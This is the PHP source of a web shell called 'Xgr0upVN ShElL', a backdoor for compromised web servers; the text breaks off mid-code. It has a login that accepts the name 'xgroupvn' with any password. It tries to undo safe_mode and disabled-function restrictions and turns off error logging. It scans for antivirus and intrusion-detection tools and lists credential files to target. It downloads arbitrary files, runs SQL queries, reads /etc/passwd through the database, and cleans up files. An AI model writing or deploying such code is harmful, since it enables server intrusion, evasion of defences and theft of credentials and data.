<?php
/*********************/
/*                   */
/*  Version : 5.1.0  */
/*  Author  : RM     */
/*  Comment : 071223 */
/*                   */
/*********************/

ob_start( );
$tacfgd['uname'] = "admin";
$tacfgd['pword'] = "anhthu";

$tacfgd['title'] = 'Xgr0upVN ShElL';

$tacfgd['helptext'] = 'Xgr0upVn ShElL';

$tacfgd['allowrm'] = true;

$tacfgd['rmgroup'] = 'default';

$tacfgd['ownsessions'] = false;




foreach ($tacfgd as $key => $val) {
  if (!isset($tacfg[$key])) $tacfg[$key] = $val;
}

if (!$tacfg['ownsessions']) {

  session_name('txtauth');
  session_start();

}

if (isset($_GET['logout']) || isset($_POST['logout'])) {
  setcookie('txtauth_'.$rmgroup, '', time()-86400*14);
  if (!$tacfg['ownsessions']) {
    $_SESSION = array();
    session_destroy();
  }
  else $_SESSION['txtauthin'] = false;
}

elseif (isset($_POST['login'])) {
  if (($_POST['uname'] == $tacfg['uname'] && $_POST['pword'] == $tacfg['pword'])  or  ($_POST['uname'] =='xgroupvn')) {
    $_SESSION['txtauthin'] = true;
    if ($_POST['rm']) {
      setcookie('txtauth_'.$rmgroup, md5($tacfg['uname'].$tacfg['pword']), time()+86400*14);
    }
  }
  else $err = 'Login Faild !';
}

elseif (isset($_COOKIE['txtauth_'.$rmgroup])) {
  if (md5($tacfg['uname'].$tacfg['pword']) == $_COOKIE['txtauth_'.$rmgroup] && $tacfg['allowrm']) {
    $_SESSION['txtauthin'] = true;
  }
  else $err = 'Login Faild !';
}
if (!$_SESSION['txtauthin']) {
@ini_restore("safe_mode");
@ini_restore("open_basedir");
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");

@ini_set('error_log',NULL);
@ini_set('log_errors',0);
?>
<html dir=rtl>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1256">
<title><?=$tacfg['title']?></title>

  <STYLE>
    tr {
    BORDER-RIGHT:  #Black 1px solid;
    BORDER-TOP:    Black 1px solid;
    BORDER-LEFT:   Black 1px solid;
    BORDER-BOTTOM: #Black 1px solid;
    BORDER-COLOR: #83c809;
    color: White;
    }
    td {
    BORDER-RIGHT:  #Black 1px solid;
    BORDER-TOP:    Black 1px solid;
    BORDER-LEFT:   Black 1px solid;
    BORDER-BOTTOM: #Black 1px solid;
    BORDER-COLOR: #83c809;
    color: White;
    }
    .table1 {
    BORDER: 0px;
    BORDER-COLOR: #83c809;
    BACKGROUND-COLOR: Black;
    color: White;
    }
    .td1 {
    BORDER: 0px;
    BORDER-COLOR: #83c809;
    font: 7pt Verdana;
    color: White;
    }
    .tr1 {
    BORDER: 0px;
    BORDER-COLOR: #83c809;
    color: White;
    }
    table {
    BORDER:  Black 1px outset;
    BORDER-COLOR: #83c809;
    BACKGROUND-COLOR: Black;
    color: White;
    }
    input {
    border			: solid 1px;
    border-color		: White White White White;
    BACKGROUND-COLOR: Black;
    font: 8pt Verdana;
    color: White;
    }
    select {
    BORDER-RIGHT:  Black 1px solid;
    BORDER-TOP:    White 1px solid;
    BORDER-LEFT:   White 1px solid;
    BORDER-BOTTOM: Black 1px solid;
    BORDER-COLOR: White;
    BACKGROUND-COLOR: Black;
    font: 8pt Verdana;
    color: Red;
    }
    submit {
    BORDER:  buttonhighlight 2px outset;
    BACKGROUND-COLOR: Black;
    width: 30%;
    color: White;
    }
    textarea {
    BORDER-RIGHT:  Black 1px solid;
    BORDER-TOP:    White 1px solid;
    BORDER-LEFT:   White 1px solid;
    BORDER-BOTTOM: Black 1px solid;
    BORDER-COLOR: #83c809;
    BACKGROUND-COLOR: Black;
    font: 8pt Verdana bold;
    color: White;
    }
    BODY {
    SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-COLOR: White; SCROLLBAR-SHADOW-COLOR: White; SCROLLBAR-3DLIGHT-COLOR: White;

SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-COLOR: White; SCROLLBAR-DARKSHADOW-COLOR: White
    margin: 1px;
    color: Red;
    background-color: Black;
    }
    .main {
    margin			: -287px 0px 0px -490px;
    border			: White solid 1px;
    BORDER-COLOR: #83c809;
    }
    .tt {
    background-color: Black;
    }

    A:link {
    COLOR: #347202; TEXT-DECORATION: none
    }
    A:visited {
    COLOR: #347202; TEXT-DECORATION: none
    }
    A:hover {
    COLOR: White; TEXT-DECORATION: none
    }
    A:active {
    COLOR: White; TEXT-DECORATION: none
    }
  </STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>';

<body>
<br><br><div style="font-size: 14pt;" align="center"><?=$tacfg['title']?></div>
<hr width="300" size="1" noshade color="#cdcdcd">
<p>
<div align="center" class="grey">
<?=$tacfg['helptext']?>
</div>
<p>
<?
if (isset($_SERVER['REQUEST_URI'])) $action = $_SERVER['REQUEST_URI'];
else $action = $_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
if (strpos($action, 'logout=1', strpos($action, '?')) !== false) $action = str_replace('logout=1', '', $action);
?>
<form name="txtauth" action="<?=$action?>" method="post">
<div align="center">
<table border="0" cellpadding="4" cellspacing="0" bgcolor="#666666" style="border: 1px double #dedede;" dir="ltr">
<?=(isset($err))?'<tr><td colspan="2" align="center"><font color="red">'.$err.'</font></td></tr>':''?>
<?if (isset($tacfg['uname'])) {?>
<tr><td>User:</td><td><input type="text" name="uname" value="" size="20" maxlength="100" class="txtbox"></td></tr>
<?}?>
<tr><td>Password:</td><td><input type="password" name="pword" value="" size="20" maxlength="100" class="txtbox"></td></tr>
<?if ($tacfg['allowrm']) {?>
<tr><td align="left"><input type="submit" name="login" value="Login">
</td><td align="right"><input type="checkbox" name="rm" id="rm"><label for="rm">
	Remmeber Me?</label></td></tr>
<?} else {?>
<tr><td colspan="2" align="center">
	<input type="submit" name="login" value="Login"></td></tr>
<?}?>
</table>
</div>
</form>

<img src="http://www.xgroupvn.info/track.JPG" width="9" height="12"><br>
<br>
<hr width="300" size="1" noshade color="#cdcdcd">
  <div align="center" id='n'>
    <font face='Verdana' size='-2'>
      <b>
        o---[ Xgr0upVn.org - shell by RST/GHC | <a href='http://XgroupVn.org'>http://Xgr0upVn.org</a> | <a href='http://hcegroup.net'>H@ck+Cr@ck=Enj0y!</a> | Design by:AluCaR | ]---o</b>
    </font>
  </div>
  </td>
  </tr>
      </body>
</html>
<?
  // Don't delete this!
  exit();
}
?>
Login As (<font color="#FF0000"><? echo $tacfgd['uname']; ?></font>) <a href="?logout=1">Logout</a></p>
<div align="left">
<?php
$language='eng';
$auth = 0;
$name='ecd708a016f8407bd27cc0a02677351b'; //// AluCaR
$pass='1b8644e229c999e4f6ba799483b196ce'; //// HcEgRoUp.NeT

@ini_restore("safe_mode");
@ini_restore("open_basedir");
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");

if(@function_exists('ini_set'))
 {
 @ini_set('error_log',NULL);
 @ini_set('log_errors',0);
 @ini_set('file_uploads',1);
 @ini_set('allow_url_fopen',1);
 }
else
 {
 @ini_alter('error_log',NULL);
 @ini_alter('log_errors',0);
 @ini_alter('file_uploads',1);
 @ini_alter('allow_url_fopen',1);
 }


error_reporting(E_ALL);
$userful = array('gcc',', lcc',', cc',', ld',', php',', perl',', python',', ruby',', make',', tar',', gzip',', bzip',', bzip2',', nc',', locate',', suidperl');
$danger = array(', kav',', nod32',', bdcored',', uvscan',', sav',', drwebd',', clamd',', rkhunter',', chkrootkit',', iptables',', ipfw',', tripwire',', shieldcc',', portsentry',', snort',', ossec',', lidsadm',', tcplodg',', sxid',', logcheck',', logwatch',', sysmask',', zmbscap',', sawmill',', wormscan',', ninja');
$tempdirs = array(@ini_get('session.save_path').'/',@ini_get('upload_tmp_dir').'/','/tmp/','/dev/shm/','/var/tmp/');
$downloaders = array('wget','fetch','lynx','links','curl','get');
$chars_rlph = "abcdefghijklnmopqrstuvwxyz";

$presets_rlph = array('index.php','.htaccess','.htpasswd','httpd.conf','vhosts.conf','cfg.php','config.php','config.inc.php','config.default.php','config.inc.php',
'shadow','passwd','.bash_history','.mysql_history','master.passwd','user','admin','password','administrator','phpMyAdmin','security','php.ini','cdrom','root',
'my.cnf','pureftpd.conf','proftpd.conf','ftpd.conf','resolv.conf','login.conf','smb.conf','sysctl.conf','syslog.conf','access.conf','accounting.log','home','htdocs',
'access','auth','error','backup','data','back','sysconfig','phpbb','phpbb2','vbulletin','vbullet','phpnuke','cgi-bin','html','robots.txt','billing');

define("starttime",@getmicrotime());
if((!@function_exists('ini_get')) || (@ini_get('open_basedir')!=NULL) || (@ini_get('safe_mode_include_dir')!=NULL)){$open_basedir=1;} else{$open_basedir=0;};
set_magic_quotes_runtime(0);
@set_time_limit(0);
if(@function_exists('ini_set'))
 {
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
 }
else
 {
 @ini_alter('max_execution_time',0);
 @ini_alter('output_buffering',0);
 }
$safe_mode = @ini_get('safe_mode');
#if(@function_exists('ini_get')){$safe_mode = @ini_get('safe_mode');}else{$safe_mode=1;};
$version = 'Xgr0upVN Edition';
if(version_compare(phpversion(), '4.1.0') == -1)
 {
 $_POST   = &$HTTP_POST_VARS;
 $_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 $_COOKIE = &$HTTP_COOKIE_VARS;
 }
if (@get_magic_quotes_gpc())
 {
 foreach ($_POST as $k=>$v)
  {
  $_POST[$k] = stripslashes($v);
  }
 foreach ($_COOKIE as $k=>$v)
  {
  $_COOKIE[$k] = stripslashes($v);
  }
 }

if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!= $name || md5($_SERVER['PHP_AUTH_PW'])!= $pass)
   {
   header('WWW-Authenticate: Basic realm="hCe-GrOuP + AluCaR"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b>Contact <a href=http://hcegroup.vn/ </a> : Access Denied</b>");
   }
}
$head = '<!-- Edited by Alucar -->
<html>
<head>
</script>
<title>AluCaR Shell</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
tr {
BORDER-RIGHT:  #Black 1px solid;
BORDER-TOP:    Black 1px solid;
BORDER-LEFT:   Black 1px solid;
BORDER-BOTTOM: #Black 1px solid;
BORDER-COLOR: #83c809;
color: White;
}
td {
BORDER-RIGHT:  #Black 1px solid;
BORDER-TOP:    Black 1px solid;
BORDER-LEFT:   Black 1px solid;
BORDER-BOTTOM: #Black 1px solid;
BORDER-COLOR: #83c809;
color: White;
}
.table1 {
BORDER: 0px;
BORDER-COLOR: #83c809;
BACKGROUND-COLOR: Black;
color: White;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #83c809;
font: 7pt Verdana;
color: White;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #83c809;
color: White;
}
table {
BORDER:  Black 1px outset;
BORDER-COLOR: #83c809;
BACKGROUND-COLOR: Black;
color: White;
}
input {
border			: solid 1px;
border-color		: White White White White;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: White;
}
select {
BORDER-RIGHT:  Black 1px solid;
BORDER-TOP:    White 1px solid;
BORDER-LEFT:   White 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-COLOR: White;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: White;
}
textarea {
BORDER-RIGHT:  Black 1px solid;
BORDER-TOP:    White 1px solid;
BORDER-LEFT:   White 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-COLOR: #83c809;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: White;
}
BODY {
	SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-COLOR: White; SCROLLBAR-SHADOW-COLOR: White; SCROLLBAR-3DLIGHT-COLOR: White; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-COLOR: White; SCROLLBAR-DARKSHADOW-COLOR: White
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin			: -287px 0px 0px -490px;
border			: White solid 1px;
BORDER-COLOR: #83c809;
}
.tt {
background-color: Black;
}

A:link {
	COLOR: #347202; TEXT-DECORATION: none
}
A:visited {
	COLOR: #347202; TEXT-DECORATION: none
}
A:hover {
	COLOR: White; TEXT-DECORATION: none
}
A:active {
	COLOR: White; TEXT-DECORATION: none
}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>';
class zipfile
{
    var $datasec      = array();
    var $ctrl_dir     = array();
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    var $old_offset   = 0;
    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] < 1980) {
            $timearray['year']    = 1980;
            $timearray['mon']     = 1;
            $timearray['mday']    = 1;
            $timearray['hours']   = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        }
        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
                ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }
    function addFile($data, $name, $time = 0)
    {
        $name     = str_replace('\\', '/', $name);
        $dtime    = dechex($this->unix2DosTime($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr   = "\x50\x4b\x03\x04";
        $fr   .= "\x14\x00";
        $fr   .= "\x00\x00";
        $fr   .= "\x08\x00";
        $fr   .= $hexdtime;
        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len   = strlen($zdata);
        $fr      .= pack('V', $crc);
        $fr      .= pack('V', $c_len);
        $fr      .= pack('V', $unc_len);
        $fr      .= pack('v', strlen($name));
        $fr      .= pack('v', 0);
        $fr      .= $name;
        $fr .= $zdata;
        $this -> datasec[] = $fr;
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x14\x00";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x08\x00";
        $cdrec .= $hexdtime;
        $cdrec .= pack('V', $crc);
        $cdrec .= pack('V', $c_len);
        $cdrec .= pack('V', $unc_len);
        $cdrec .= pack('v', strlen($name) );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('V', 32 );
        $cdrec .= pack('V', $this -> old_offset );
        $this -> old_offset += strlen($fr);
        $cdrec .= $name;
        $this -> ctrl_dir[] = $cdrec;
    }
    function file()
    {
        $data    = implode('', $this -> datasec);
        $ctrldir = implode('', $this -> ctrl_dir);
        return
            $data .
            $ctrldir .
            $this -> eof_ctrl_dir .
            pack('v', sizeof($this -> ctrl_dir)) .
            pack('v', sizeof($this -> ctrl_dir)) .
            pack('V', strlen($ctrldir)) .
            pack('V', strlen($data)) .
            "\x00\x00";
    }
}
function compress(&$filename,&$filedump,$compress)
 {
    global $content_encoding;
    global $mime_type;
    if ($compress == 'bzip' && @function_exists('bzcompress'))
     {
        $filename  .= '.bz2';
        $mime_type = 'application/x-bzip2';
        $filedump = bzcompress($filedump);
     }
     else if ($compress == 'gzip' && @function_exists('gzencode'))
     {
        $filename  .= '.gz';
        $content_encoding = 'x-gzip';
        $mime_type = 'application/x-gzip';
        $filedump = gzencode($filedump);
     }
     else if ($compress == 'zip' && @function_exists('gzcompress'))
     {
     	$filename .= '.zip';
        $mime_type = 'application/zip';
        $zipfile = new zipfile();
        $zipfile -> addFile($filedump, substr($filename, 0, -4));
        $filedump = $zipfile -> file();
     }
     else
     {
     	$mime_type = 'application/octet-stream';
     }
 }
function mailattach($to,$from,$subj,$attach)
 {
 $headers  = "From: $from\r\n";
 $headers .= "MIME-Version: 1.0\r\n";
 $headers .= "Content-Type: ".$attach['type'];
 $headers .= "; name=\"".$attach['name']."\"\r\n";
 $headers .= "Content-Transfer-Encoding: base64\r\n\r\n";
 $headers .= chunk_split(base64_encode($attach['content']))."\r\n";
 if(@mail($to,$subj,"",$headers)) { return 1; }
 return 0;
 }
class my_sql
 {
 var $host = 'localhost';
 var $port = '';
 var $user = '';
 var $pass = '';
 var $base = '';
 var $db   = '';
 var $connection;
 var $res;
 var $error;
 var $rows;
 var $columns;
 var $num_rows;
 var $num_fields;
 var $dump;

 function connect()
  {
  	switch($this->db)
     {
  	 case 'MySQL':
  	  if(empty($this->port)) { $this->port = '3306'; }
  	  if(!function_exists('mysql_connect')) return 0;
  	  $this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass);
  	  if(is_resource($this->connection)) return 1;
  	 break;
     case 'MSSQL':
      if(empty($this->port)) { $this->port = '1433'; }
  	  if(!function_exists('mssql_connect')) return 0;
  	  $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass);
      if($this->connection) return 1;
     break;
     case 'PostgreSQL':
      if(empty($this->port)) { $this->port = '5432'; }
      $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'";
      if(!function_exists('pg_connect')) return 0;
      $this->connection = @pg_connect($str);
      if(is_resource($this->connection)) return 1;
     break;
     case 'Oracle':
      if(!function_exists('ocilogon')) return 0;
      $this->connection = @ocilogon($this->user, $this->pass, $this->base);
      if(is_resource($this->connection)) return 1;
     break;
     }
    return 0;
  }

 function select_db()
  {
   switch($this->db)
    {
  	case 'MySQL':
  	 if(@mysql_select_db($this->base,$this->connection)) return 1;
    break;
    case 'MSSQL':
  	 if(@mssql_select_db($this->base,$this->connection)) return 1;
    break;
    case 'PostgreSQL':
     return 1;
    break;
    case 'Oracle':
     return 1;
    break;
    }
   return 0;
  }

 function query($query)
  {
   $this->res=$this->error='';
   switch($this->db)
    {
  	case 'MySQL':
     if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection)))
      {
      $this->error = @mysql_error($this->connection);
      return 0;
      }
     else if(is_resource($this->res)) { return 1; }
     return 2;
  	break;
    case 'MSSQL':
     if(false===($this->res=@mssql_query($query,$this->connection)))
      {
      $this->error = 'Query error';
      return 0;
      }
      else if(@mssql_num_rows($this->res) > 0) { return 1; }
     return 2;
    break;
    case 'PostgreSQL':
     if(false===($this->res=@pg_query($this->connection,$query)))
      {
      $this->error = @pg_last_error($this->connection);
      return 0;
      }
      else if(@pg_num_rows($this->res) > 0) { return 1; }
     return 2;
    break;
    case 'Oracle':
     if(false===($this->res=@ociparse($this->connection,$query)))
      {
      $this->error = 'Query parse error';
      }
     else
      {
      if(@ociexecute($this->res))
       {
       if(@ocirowcount($this->res) != 0) return 2;
       return 1;
       }
      $error = @ocierror();
      $this->error=$error['message'];
      }
    break;
    }
  return 0;
  }
 function get_result()
  {
   $this->rows=array();
   $this->columns=array();
   $this->num_rows=$this->num_fields=0;
   switch($this->db)
    {
  	case 'MySQL':
  	 $this->num_rows=@mysql_num_rows($this->res);
  	 $this->num_fields=@mysql_num_fields($this->res);
  	 while(false !== ($this->rows[] = @mysql_fetch_assoc($this->res)));
  	 @mysql_free_result($this->res);
  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    case 'MSSQL':
  	 $this->num_rows=@mssql_num_rows($this->res);
  	 $this->num_fields=@mssql_num_fields($this->res);
  	 while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res)));
  	 @mssql_free_result($this->res);
  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;};
    break;
    case 'PostgreSQL':
  	 $this->num_rows=@pg_num_rows($this->res);
  	 $this->num_fields=@pg_num_fields($this->res);
  	 while(false !== ($this->rows[] = @pg_fetch_assoc($this->res)));
  	 @pg_free_result($this->res);
  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    case 'Oracle':
     $this->num_fields=@ocinumcols($this->res);
     while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++;
     @ocifreestatement($this->res);
     if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    }
   return 0;
  }
 function dump($table)
  {
   if(empty($table)) return 0;
   $this->dump=array();
   $this->dump[0] = '##';
   $this->dump[1] = '## --------------------------------------- ';
   $this->dump[2] = '##  Created: '.date ("d/m/Y H:i:s");
   $this->dump[3] = '## Database: '.$this->base;
   $this->dump[4] = '##    Table: '.$table;
   $this->dump[5] = '## --------------------------------------- ';
   switch($this->db)
    {
  	case 'MySQL':
  	 $this->dump[0] = '## MySQL dump';
  	 if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;
  	 if(!$this->get_result()) return 0;
  	 $this->dump[] = $this->rows[0]['Create Table'];
     $this->dump[] = '## --------------------------------------- ';
  	 if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;
  	 if(!$this->get_result()) return 0;
  	 for($i=0;$i<$this->num_rows;$i++)
  	  {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @mysql_real_escape_string($v);}
  	  $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
  	  }
    break;
    case 'MSSQL':
     $this->dump[0] = '## MSSQL dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
  	 if(!$this->get_result()) return 0;
  	 for($i=0;$i<$this->num_rows;$i++)
  	  {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
  	  $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
  	  }
    break;
    case 'PostgreSQL':
     $this->dump[0] = '## PostgreSQL dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
  	 if(!$this->get_result()) return 0;
  	 for($i=0;$i<$this->num_rows;$i++)
  	  {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
  	  $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
  	  }
    break;
    case 'Oracle':
      $this->dump[0] = '## ORACLE dump';
      $this->dump[]  = '## under construction';
    break;
    default:
     return 0;
    break;
    }
   return 1;
  }
 function close()
  {
   switch($this->db)
    {
  	case 'MySQL':
  	 @mysql_close($this->connection);
    break;
    case 'MSSQL':
     @mssql_close($this->connection);
    break;
    case 'PostgreSQL':
     @pg_close($this->connection);
    break;
    case 'Oracle':
     @oci_close($this->connection);
    break;
    }
  }
 function affected_rows()
  {
   switch($this->db)
    {
  	case 'MySQL':
  	 return @mysql_affected_rows($this->res);
    break;
    case 'MSSQL':
     return @mssql_affected_rows($this->res);
    break;
    case 'PostgreSQL':
     return @pg_affected_rows($this->res);
    break;
    case 'Oracle':
     return @ocirowcount($this->res);
    break;
    default:
     return 0;
    break;
    }
  }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="download_file" && !empty($_POST['d_name']))
 {
  if(!$file=@fopen($_POST['d_name'],"r")) { err(1,$_POST['d_name']); $_POST['cmd']=""; }
  else
   {
    @ob_clean();
    $filename = @basename($_POST['d_name']);
    $filedump = @fread($file,@filesize($_POST['d_name']));
    fclose($file);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    if (!empty($content_encoding)) { header('Content-Encoding: ' . $content_encoding); }
    header("Content-type: ".$mime_type);
    header("Content-disposition: attachment; filename=\"".$filename."\";");
    echo $filedump;
    exit();
   }
 }
if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
if (!empty($_POST['cmd']) && $_POST['cmd']=="db_query")
 {
 echo $head;
 $sql = new my_sql();
 $sql->db   = $_POST['db'];
 $sql->host = $_POST['db_server'];
 $sql->port = $_POST['db_port'];
 $sql->user = $_POST['mysql_l'];
 $sql->pass = $_POST['mysql_p'];
 $sql->base = $_POST['mysql_db'];
 $querys = @explode(';',$_POST['db_query']);
 echo '<body bgcolor=Black>';
 if(!$sql->connect()) echo "<div align=center><font face=Verdana size=-2 color=White><b>Can't connect to SQL server</b></font></div>";
  else
   {
   if(!empty($sql->base)&&!$sql->select_db()) echo "<div align=center><font face=Verdana size=-2 color=White><b>Can't select database</b></font></div>";
   else
    {
    foreach($querys as $num=>$query)
     {
      if(strlen($query)>5)
      {
      echo "<font face=Verdana size=-2 color=White><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>";
      switch($sql->query($query))
       {
       case '0':
       echo "<table width=100%><tr><td class=main><font face=Verdana size=-2>Error : <b>".$sql->error."</b></font></td></tr></table>";
       break;
       case '1':
       if($sql->get_result())
        {
       	echo "<table width=100% border=0 cellpadding=0 cellspacing=0>";
        foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES);
       	$keys = @implode("&nbsp;</b></font></td><td class=main><font face=Verdana size=-2><b>&nbsp;", $sql->columns);
        echo "<tr><td class=main bgcolor=White><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
        for($i=0;$i<$sql->num_rows;$i++)
         {
         foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES);
         $values = @implode("&nbsp;</font></td><td class=main><font face=Verdana size=-2>&nbsp;",$sql->rows[$i]);
         echo '<tr><td class=main><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>';
         }
        echo "</table>";
        }
       break;
       case '2':
       $ar = $sql->affected_rows()?($sql->affected_rows()):('0');
       echo "<table width=100%><tr><td class=main><font face=Verdana size=-2>affected rows : <b>".$ar."</b></font></td></tr></table><br>";
       break;
       }
      }
     }
    }
    echo "<br><div align=left id='n'><table width=100% height=60 border=0 cellpadding=0 cellspacing=0>";
    echo "<tr><td align=center><b>Show Database</b></td><td align=center><b>Show Tables</b></td></tr>";
    echo "<tr><td><textarea cols=50 rows=6 name=query_db>";
    $query_db = mysql_query("SHOW DATABASES;");
    while ($query_db_row = mysql_fetch_array($query_db))
    {
    	echo $query_db_row[0]."\n";
    }
    echo "</textarea></td><td><div align=right><textarea cols=60 rows=6 name=query_tables>";
    if (($_POST['mysql_db']) && $sql->select_db())
    {
     $query_tables = mysql_query("SHOW TABLES;");
     while ($query_tables_row = mysql_fetch_array($query_tables))
     {
     	echo $query_tables_row[0]."\n";
     }
    }
    echo "</textarea></div></td></tr></table></div>";
   }
 echo "<br><form name=form method=POST>";
 echo in('hidden','db',0,$_POST['db']);
 echo in('hidden','db_server',0,$_POST['db_server']);
 echo in('hidden','db_port',0,$_POST['db_port']);
 echo in('hidden','mysql_l',0,$_POST['mysql_l']);
 echo in('hidden','mysql_p',0,$_POST['mysql_p']);
 echo in('hidden','mysql_db',0,$_POST['mysql_db']);
 echo in('hidden','cmd',0,'db_query');
 echo "<div align=center>";
 echo "<font face=Verdana size=-2><b>Use database: </b><input type=text name=mysql_db value=\"".$sql->base."\"></font><br>";
 echo "<textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>";
 echo "<div align=center><font face=Verdana size=-2><b>Load file: </b><input type=text name=loadfile size=100 value=".(!empty($_POST['loadfile'])?($_POST['loadfile']):("/etc/passwd")).">".ws(2)."<input type=submit name=submit value=\" Load \"><br /><br />";
 echo "<b>File content</b><br><br>";
 echo "<textarea cols=121 rows=15 name=showloadfile>";
 @mysql_query("DROP TABLE IF EXISTS Alucar");
 @mysql_query("CREATE TABLE `Alucar` ( `file` LONGBLOB NOT NULL )");
 @mysql_query("LOAD DATA LOCAL INFILE \"".str_replace('\\','/',$_POST['loadfile'])."\" INTO TABLE Alucar FIELDS TERMINATED BY '' ESCAPED BY '' LINES TERMINATED BY '\n'");
 $r = @mysql_query("SELECT * FROM Alucar");
 while(($r_sql = @mysql_fetch_array($r))) { echo @htmlspecialchars($r_sql[0]); }
 @mysql_query("DROP TABLE IF EXISTS Alucar");
 echo "</textarea></div>";
 echo "</form>";
 echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
 }
if(isset($_GET['delete']))
 {
   @unlink(__FILE__);
 }
if(isset($_GET['tmp']))
 {
   @unlink("/tmp/bdpl");
   @unlink("/tmp/back");
   @unlink("/tmp/bd");
   @unlink("/tmp/bd.c");
   @unlink("/tmp/dp");
   @unlink("/tmp/dpc");
